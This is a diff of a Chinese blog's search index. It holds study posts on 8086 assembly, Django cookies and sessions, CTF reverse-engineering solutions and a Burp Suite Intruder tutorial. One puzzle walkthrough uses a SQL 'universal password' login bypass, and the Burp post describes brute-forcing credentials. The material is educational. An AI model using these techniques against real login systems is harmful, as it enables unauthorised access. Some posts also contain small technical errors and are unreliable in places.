     <content type="text"><![CDATA[寄存器 一个典型的CPU有运算器、控制器、寄存器等器件构成 寄存器是CPU中程序员可以用执行读写的部件。程序员通过改变各种寄存器中的内容来实现对CPU的控制 不同的CPU，寄存器的个数、结构是不同的。8086CPU有14个寄存器，每个寄存器有一个名称。这些寄存器是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PWS、 通用寄存器 8086CPU的的所有寄存器都是16位的，可以存放两个字节，AX、BX、CX、DX、这四个寄存器位通用寄存器 一个16位的寄存器可以存储一个16位的数据，所能存储的数据最大值为2^16-1，或用16进制表示为FFFFH，也为10000H-1 AX的低8位构成了AL寄存器，高8位构成了AH寄存器，AH和AL寄存器是可以独立使用的 字在寄存器中的存储 一个16位的寄存器可以存放两个字节（byte），即为一个字（word），一个字等于两个字节 而计算机的存储单元为字节（byte），一个内存（存储）单元可以存放8位数据（bit），也就是说，计算机中的数据大多是由1~N个8位数据构成。 很多时候，用16进制表示数据可以直观的看出数据是由哪些8位数据构成，如2000写成4E20，可以看出是由4E和20两个8位数据构成的，如果AX中存放4E20H，则AH里是4E，AL里是20mov和add汇编指令原AX，BX中的值：0000H，0000H问题2.1在执行前ax和bx中的数据都为8226H，相加后所得值为：1044CH，但ax为16位寄存器，只能存放4位十六进制的数据，所以最高位的1不能在ax中保存，，ax中的数据为：044CH问题2.2在执行前，al中的数据为C5H，相加后所得的值为：158H，但是al为8位寄存器，只能诚邀您放两位16精致的数据，所以最高位的1丢失，ax中的数据为：0058H检测点2.1： (1)写出每条汇编指令执行后相关寄存器中的值。 mov ax,62627 AX= F4A3H mov ah,31H AX=31A3H mov al,23H AX=3123H add ax,ax AX=6246H mov bx,826CH BX=826CH mov cx,ax CX=6246H mov ax,bx AX=826CH add ax,bx AX=04D8H mov al,bh AX=0482H mov ah,bl AX=6C82H add ah,ah AX=D882H add al,6 AX=D888H add al,al AX=D810H mov ax,cx AX=6246H (2)只能使用目前学过的汇编指令，最多使用4条指令，计算2的4次方. mov ax,2h add ax,ax add ax,ax add ax,ax 物理地址 段地址*16+偏移地址=物理地址的本质含义CPU在访问内存时，用一个基础地址（段地址*16）和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址 检测点2.2（1）给定段地址为0001H，仅通过变化偏移地址寻址，CPU的寻址范围为多少到多少？ 答：物理地址=SA*16+EA EA的变化范围为0H~FFFFH 物理地址范围为（SA16+0H）~（SA16+FFFFH） 现在SA=0001H，那么寻址范围为 （0001H16+0H）~（0001H16+FFFFH）=00010H~1000FH （2）有一数据存放在内存20000H单元中，现给定段地址为SA，若想用偏移地址寻到此单元。则SA应满足的条件是：最小为多少？最大为多少？ 答： 物理地址 20000H ＝ SA * 10H ＋ 偏移地址 显然，偏移地址应该取最大值，SA 才能达到最小。 那么，偏移地址取最大值：FFFFH，行吗？ 代入上述方程，发现，两边的，最末位，不相等。 偏移地址最大值，只能取到：FFF0H，方程才有可能成立。 按照公式： 物理地址 ＝ SA * 10H ＋ 偏移地址 可知，物理地址、偏移地址，两者的最低位，必定是相同的。 当物理地址＝20000H，偏移地址也只能是：XXX0H，取最大就是 FFF0H。 于是：SA = (20000H － FFF0H) / 16＝10010H / 16 ＝ 1001H。 标记：王爽汇编语言，段地址*16+偏移地址=物理地址，其中16是十进制。 提示，反过来思考一下，当段地址给定为多少，CPU无论怎么变化偏移地址都无法寻到20000H单元？ 答： 先求出，段地址为多少的时候，变化偏移地址可找到20000H地址单元。 段地址 × 16 + 偏移地址 = 20000H 偏移地址=0000H，段地址则为 2000H； 偏移地址=FFF0H，段地址则为 1001H。 那么，当段地址大于 2000H，或小于 1001H，就不能找到 20000H。 CS和IPCS和IP是8086CPU中最为关键的寄存器，CS为代码段寄存器（存放段地址），IP为指令指针寄存器（存放偏移地址） 1、 汇编指令由操作码和操作数组成 如：mov ax,0 mov为操作数 表示指令的功能（是传送指令） ax,0是2个操作数 即0（0000H）为源操作数 ax为目的操作数 该指令就是 将源操作数传送给目的操作数 从ax可以看出是一条16位的传送指令2、 mov ax,0在内存中的机器指令是B8 00 00 B8 是操作码 表示是一条以ax为目的操作数的传送指令（操作数ax为寄存器寻址 隐含在操作码 中，00 00 表示的是一个16位的立即数即0000H 低8位在前 高8位在后。3、汇编指令在内存中 就是以B8 00 00机器指令表示的二进制代码。 问题2.3 检测点下面的3条指令执行后，cpu几次修改IP？都是在什么时候？最后IP中的值是多少？ mov ax,bx sub ax,ax jmp ax 注：mov ax,bx (高级编程语言就是ax=bx ) sub ax,ax (高级编程语言就是ax=ax-ax 发现ax=0H) jmp ax (偏移增量为ax,进而IP=IP+ax，即加上索引的字节数） 一共修改四次 第一次：读取mov ax,bx之后 第二次：读取sub ax,ax之后 第三次：读取jmp ax之后 第四次：执行jmp ax修改IP 最后IP的值为0000H，因为最后ax中的值为0000H，所以IP中的值也为0000H]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -222,6 +301,9 @@
     <title><![CDATA[cpu与存储器]]></title>
     <url>%2F2018%2F09%2F07%2Fcpu%2F</url>
     <content type="text"><![CDATA[cpu中央处理器（CPU，Central Processing Unit）是一块超大规模的集成电路，是一台计算机的运算核心（Core）和控制核心（ Control Unit）。它的功能主要是解释计算机指令以及处理计算机软件中的数据。中央处理器主要包括运算器（算术逻辑运算单元，ALU，Arithmetic Logic Unit）和高速缓冲存储器（Cache）及实现它们之间联系的数据（Data）、控制及状态的总线（Bus）。它与内部存储器（Memory）和输入/输出（I/O）设备合称为电子计算机三大核心部件。 物理结构CPU包括运算逻辑部件、寄存器部件和控制部件等。 逻辑部件运算逻辑部件。可以执行定点或浮点算术运算操作、移位操作以及逻辑操作，也可执行地址运算和转换。 寄存器寄存器部件，包括寄存器、专用寄存器和控制寄存器。 通用寄存器又可分定点数和浮点数两类，它们用来保存指令执行过程中临时存放的寄存器操作数和中间（或最终）的操作结果。 通用寄存器是中央处理器的重要部件之一。 工作过程CPU从存储器或高速缓冲存储器中取出指令，放入指令寄存器，并对指令译码。它把指令分解成一系列的微操作，然后发出各种控制命令，执行微操作系列，从而完成一条指令的执行。指令是计算机规定执行操作的类型和操作数的基本命令。指令是由一个字节或者多个字节组成，其中包括操作码字段、一个或多个有关操作数地址的字段以及一些表征机器状态的状态字以及特征码。有的指令中也直接包含操作数本身。 存储器CPU是计算机的核心部件，要想让一个CPU工作，就必须向它提供指令和数据。而指令和数据在存储器中存放，也就是我们平时说的内存。 存储单元 存储器被划分若干个存储单元，每个存储单元从0开始循序编号 这些编号可以看作存储单元在存储器中的地址 一个存储单元可以存储一个Byte，即8个二进制位（bit） CPU对存储器的读写 CPU通过地址线将地址信息3发出 CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据 存储器将三号单元中的数据8通过数据线送入CPU。写操作与读操作的步骤相似。如向3号单元写入数据26 地址总线 若一个CPU有N根地址总线，也就是说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单位 数据总线 数据总线的宽度决定了CPU和外界的数据传送速度。8根数据总线 一次可传送一个8位二进制数据（即一个字节）。16根数据总线一次可传送两个字节 8088CPU的数据总线宽度为8,8086CPU的为16 控制总线 CPU对外部器件的控制是通过控制总线来进行的 控制总线的跨度决定了CPU对外部器件的控制能力 检测点1.1 一个CPU的寻址能力为8KB，那么他的地址总线宽度为13。2^n=1024*8n为总线宽度。已知2^10 = 1024因此n=13 1KB的存储器有1024个存储单元。存储单元的编号从0到1023 。2^10=1KB=1024 1KB的存储器可以存储 8192个bit, 1024 个Byte。1Byte=8bit 1GB、1MB、1KB分别是2^30 Byte,2^20 Byte,2^10 Byte。102410241024=2^301024*1024=2^201024=2^10 8080、8088、80286、80386的地址总线宽度分别为16根、20根、24根、32根，则他们的寻址能力分别为： 64 （KB）、 1 （MB）、 16 （MB）、 4 （GB）。2^10=1K 2^6=642^20=1M2^4=162^30=1G 2^2=4 8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为： 1 （B）、 1 （B）、 2 （B）、 2 （B） 4 （B）。1Byte=8bit每8根总线一次最多可传递一字节数据。 从内存中读取1024字节的数据，8086至少要读 512 次，80386至少要读 256 次。8086每次读2字节数据80386每次读4字节数据 在存储器中，数据和程序以 二进制 形式存放。数据与程序在存储器中以无差别的二进制数据形式存放 存储器芯片 一台PC机上，装有多个存储器芯片，从读写属性上看分为两类：随机存储器（RAM）和只读存储器（ROM） 随机存储器用于放供CPU使用的绝大部分程序和数据 内存地址空间 所有的物理存储器被看作一个由若干存储单元组成的的逻辑存储器 每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 CPU在这段地址空间中读写数据，实际上就是在相对于的物理存储器中读写数据]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
       <tags>
         <tag>汇编语言</tag>
       </tags>
@@ -230,22 +312,31 @@
     <title><![CDATA[Cookie和Session]]></title>
     <url>%2F2018%2F08%2F09%2FCookie%E5%92%8CSession%2F</url>
     <content type="text"><![CDATA[1、Cookie介绍 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用cookie）。Cookie名称和值可以由服务器端开发自己定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 简单来说，Cookie 是保存在浏览器的一个键值对，每次的HTTP请求都会携带 Cookie 。 cookie的作用 服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。 Django框架的下cookie1、 获取Cookie： 获取已经设置好的cookies极其简单。 每一个HttpRequest 对象都有一个COOKIES 对象，该对象的行为类似一个字典，你可以使用它读取任何浏览器发送给视图（view）的cookies。 获取普通cookie request.COOKIES[&apos;key&apos;] request.COOKIES.get(&apos;key&apos;) 解密带签名的cookie request.get_signed_cookie(key, default=RAISE_ERROR, salt=&apos;&apos;, max_age=None) 参数： default: 默认值 salt: 加密盐 max_age: 后台控制过期时间 2、设置Cookie：rep = HttpResponse(...) 或 rep ＝ render(request, ...) #设置cookie需要使用 HttpResponse对象的 set_cookie()方法 #设置普通cookie rep.set_cookie(key,value,...) #设置带签名的cookie rep.set_signed_cookie(key,value,salt=&apos;加密盐&apos;,...) #参数： key, 键 value=&apos;&apos;, 值 max_age=None, 超时时间 expires=None, 超时时间(IE requires expires, so set it if hasn&apos;t been already.) path=&apos;/&apos;, Cookie生效的路径，/ 表示根路径，特殊的：跟路径的cookie可以被任何url的页面访问 domain=None, Cookie生效的域名 secure=False, https传输 httponly=False 只能http协议传输，无法被JavaScript获取（不是绝对，底层抓包可以获取到也可以被覆盖） 由于cookie保存在客户端的电脑上，所以，JavaScript和jquery也可以操作cookie。 &lt;script src=&apos;/static/js/jquery.cookie.js&apos;&gt;&lt;/script&gt; $.cookie(&quot;list_pager_num&quot;, 30,{ path: &apos;/&apos; }); 注意： Cookie(特别是那些没通过HTTPS传输的)是非常不安全的。 因为HTTP数据是以明文发送的，所以 特别容易受到嗅探攻击。 也就是说，嗅探攻击者可以在网络中拦截并读取cookies，因此你要 绝对避免在cookies中存储敏感信息。 这就意味着您不应该使用cookie来在存储任何敏感信息。 因此不能在cookies中存储可能会被篡改的敏感数据。 在cookies中存储 IsLoggedIn=1 ，以标识用户已经登录。 犯这类错误的站点数量多的令人难以置信； 绕过这些网站的安全系统也是易如反掌。 2、Session1、介绍 在WEB开发中，服务器可以为每个用户浏览器创建一个会话对象（session对象），注意：一个浏览器独占一个session对象(默认情况下)。因此，在需要保存用户数据时，服务器程序可以把用户数据写到用户浏览器独占的session中，当用户使用浏览器访问其它程序时，其它程序可以从用户的session中取出该用户的数据，为用户服务。 Session与Cookie的区别： Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。 Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。 Session 必须要依赖 Cookie ，因为 Cookie的值就等于 Session 的Key ###Session的工作原理: 当用户第一次访问时，服务器会给其创建一个session，并且把session的Id(本质是随机字符串)以cookie的形式发送给客户端浏览器，下次再去访问服务器时，客户机浏览器会把存储到cookie中的session的Id一起传递到服务器端，服务器发现客户机浏览器带session id过来了，就会使用内存中与之对应的session为之服务 2、Django下的 Session 框架 由于存在的限制与安全漏洞，cookies和持续性会话已经成为Web开发中令人头疼的典范。 好消息是，Django的目标正是高效的“头疼杀手”，它自带的session框架会帮你搞定这些问题。 你可以用session 框架来存取每个访问者任意数据， 这些数据在服务器端存储，并对cookie的收发进行了抽象。 Cookies只存储数据的哈希会话ID，而不是数据本身，从而避免了大部分的常见cookie问题。 Django中默认支持Session，其内部提供了5种类型的Session供开发者使用： 数据库（默认） 缓存 文件 缓存+数据库 加密cookie]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
       <tags>
-        <tag>cookie</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[黑客游戏]]></title>
     <url>%2F2018%2F08%2F07%2F%E9%BB%91%E5%AE%A2%E6%B8%B8%E6%88%8F%2F</url>
     <content type="text"><![CDATA[第一关网址：http://www.cn-hack.cn/qs/5.htm 进来可以看到要求输入密码进入下一关，可以先看下页面源代码发现下一关的网址，如图： 那就进入http://www.cn-hack.cn/qs/2sdfadf.htm来到第二关 第二关是一张图片，提示密码在图片中，那就把图片下载下来，改为txt文档，打开看看，发现第三关的网址，如图： 进入第三关的网址http://www.cn-hack.cn/qs/or3.htm 第三关就直接给出密码：%68%74%74%70%3A%2F%2F%77%77%77%2E%63%6E%2D%68%61%63%6B%2E%63%6E%2F%71%73%2F%34%64%66%73%61%2E%68%74%6D ，不过是经过URL加密过的，进行URL解密得到网址：http://www.cn-hack.cn/qs/4dfsa.htm 进入第四关http://www.cn-hack.cn/qs/4dfsa.htm 需要输入用户名和密码，先看看页面源代码，没发现什么，那就随便输入用户名和密码，然后跳转到一个页面，那就在看看源代码， 发现第五关的地址进入第五关http://www.cn-hack.cn/qs/789.htm 进来就让你输入通用密码中的两个字母，想看页面源代码也看不了，上网搜搜SQL通用密码，知道了密码为 or ,输入进去就通关了]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
       <tags>
-        <tag>html 前端</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[python替换敏感词]]></title>
     <url>%2F2018%2F07%2F31%2Fpython%E6%9B%BF%E6%8D%A2%E6%95%8F%E6%84%9F%E8%AF%8D%2F</url>
     <content type="text"><![CDATA[思路如下: 首先，从敏感词文件中读取到敏感词汇，放入容器中 如果有标点符号，则把一些没用的标点符号去掉 然后，获取用户输入，判断输入是否包含敏感词汇， 并输出相对应的结果 1234567891011121314151617181920212223242526272829303132333435import osdef filter_words(path): if os.path.isfile(path): with open(path, &apos;r&apos;) as f: words = f.read() words = words.replace(&apos;，&apos;, &apos;&apos;) words = words.replace(&apos;\n&apos;, &apos;&apos;) return wordsdef sense_words(): words = filter_words(&apos;filter.txt&apos;) print(&quot;敏感字内容如下:&quot;) print(&quot;------------------------------------------------------------------&quot;) print(words) print(&quot;------------------------------------------------------------------&quot;) while True: sentence = input(&quot;请输入：&quot;) if sentence == &apos;0&apos;: print(&apos;exit&apos;) break for i in words: if i in sentence: replace = &apos;&apos; for j in range(len(i)): replace = replace + &apos;*&apos; sentence = sentence.replace(i, replace) print(sentence)if __name__ == &quot;__main__&quot;: sense_words()]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
       <tags>
         <tag>python</tag>
       </tags>
@@ -254,29 +345,33 @@
     <title><![CDATA[南邮ctf-PY交易]]></title>
     <url>%2F2018%2F07%2F27%2F%E5%8D%97%E9%82%AEctf-PY%E4%BA%A4%E6%98%93%2F</url>
     <content type="text"><![CDATA[下载后是一个pyc文件 选择https://tool.lu/pyc/ 进行解密 如下： 只是一个简单的base64加密，得到的py脚本如下： import base64 c = &apos;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&apos; m = c.decode(&quot;base64&quot;) s = &apos;&apos; for i in m: x = ord(i) - 16 x = x ^ 32 s=s+chr(x) print s 只能在python2.X下运行 得到flag：nctf{d3c0mpil1n9_PyC}]]></content>
+      <categories>
+        <category>reverse</category>
+      </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[南邮攻防训练平台逆向第四题WxyVM1]]></title>
     <url>%2F2018%2F07%2F27%2FWxyVM1%2F</url>
     <content type="text"><![CDATA[下载文件elf文件，运行输入flag，用ida打开逆向算法： 不是很复杂，可以看出flag长度需要24，最终会和已给出dword_601060进行比较，一致则成功，那么现在只需要看上面的sub_4005B6()函数了： 跟进两个地址进去看一下，发现有已经给出的处理所需数据，只是比较多，有15000个，想了想最后还是决定把数据提出来（其实是没其他办法了==） 最后是逆推py脚本： 那个15000的数组太长了，不好复制，要导出在一个文档里，才能复制完 tmp=[1, 16, 37, 3, 13, 10, 2, 11, 40, 2 ] //太长了只写前十个 final=[196, 52, 34, 177, 211, 17, 151, 7, 219, 55, 196, 6, 29, 252, 91, 237, 152, 223, 148, 216, 179, 132, 204, 8] i = 14997 while i&gt;0: v0 = tmp[i] v3 = tmp[i+2] result = tmp[i+1] if v0 == 1: final[result] -= v3 elif v0 == 2: final[result] += v3 elif v0 == 3: final[result] ^= v3 elif v0 == 4: final[result] /= v3! elif v0 == 5: final[result] ^= final[v3] final[result]&amp;=0xFF //需要注意的地方，因为ascii字符码范围为0~127，可能发生越界 i -= 3 for x in final: print(chr(x), end = &apos;&apos;) 得到flag：nctf{Embr4ce_Vm_j0in_R3} 如果不加final[result]&amp;=0xFF 这句话就会越界，如图： &amp;0xFF到底是什么意思 举个简单的例子: byte[] b = new byte[5]; b[0] = -12; byte 8位二进制 = 1个字节 char 2个字节 short (2个字节) int（4个字节） long（8个字节） float （4个字节） double（8个字节） 计算机存储数据机制：正数存储的二进制原码,负数存储的是二进制的补码。 补码是负数的绝对值反码加1。 比如-12，-12 的绝对值原码是：0000 1100 取反： 1111 0011 加1： 1111 0100 byte –&gt; int 就是由8位变 32 位 高24位全部补1： 1111 1111 1111 1111 1111 1111 1111 0100 ; 0xFF 是计算机十六进制的表示： 0x就是代表十六进制，A B C D E F 分别代表10 11 12 13 14 15 F就是15 一个F 代表4位二进制：可以看做 是 8 4 2 1。 0xFF的二进制表示就是：1111 1111。 高24位补0：0000 0000 0000 0000 0000 0000 1111 1111; -12的补码与0xFF 进行与（&amp;）操作 最后就是0000 0000 0000 0000 0000 0000 1111 0100 转换为十进制就是 244。 byte类型的数字要&amp;0xff再赋值给int类型，其本质原因就是想保持二进制补码的一致性。 当byte要转化为int的时候，高的24位必然会补1，这样，其二进制补码其实已经不一致了，&amp;0xff可以将高的24位置为0，低8位保持原样。这样做的目的就是为了保证二进制数据的一致性。 有人问为什么上面的式子中b[0]不是8位而是32位，因为当系统检测到byte可能会转化成int或者说byte与int类型进行运算的时候，就会将byte的内存空间高位补1（也就是按符号位补位）扩充到32位，再参与运算。]]></content>
+      <categories>
+        <category>reverse</category>
+      </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[BurpSuite系列----Intruder模块(暴力破解口令)]]></title>
     <url>%2F2018%2F07%2F27%2FBurpSuit%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8F%A3%E4%BB%A4%2F</url>
     <content type="text"><![CDATA[一、简介 Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 二、模块说明 Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 1：Target 目标选项(Target tab)这个选项是用来配置目标服务器的细节： 2：Positions 位置选项(Positions tab)这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板： 使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。 当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。 你可以使用选项上的按钮来控制位置上的标记： add § — 在当前光标位置插入一个位置标记。 clear § — 删除整个模板或选中的部分模板里的位置标记。 auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。4.refresh — 如果需要，可以刷新编辑器里有颜色的代码。5.clear — 删除整个编辑器内容。 3：Payloads 有效负荷选项(Payloads tab)这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。 选项1：Payload Sets Payload数量类型设置 选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变 选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作 选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 4：Opetions 选项卡(Options tab) 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。 如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。 如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。 选项2：Request Engine 设置发送请求的线程、超时重试等。 选项3：Attack Results 设置攻击结果的显示。 选项4：Grep - Match 在响应中找出存在指定的内容的一项。 选项5：Grep - Extract 通过正则提取返回信息中的内容。 选项6：Grep - Payloads 这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。 选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>web</tag>
       </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[我的世界不会下雪]]></title>
-    <url>%2F2018%2F07%2F21%2F%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E4%B8%8D%E4%BC%9A%E4%B8%8B%E9%9B%AA%2F</url>
-    <content type="text"><![CDATA[我的世界不会下雪 啦啦啦]]></content>
   </entry>
 </search>
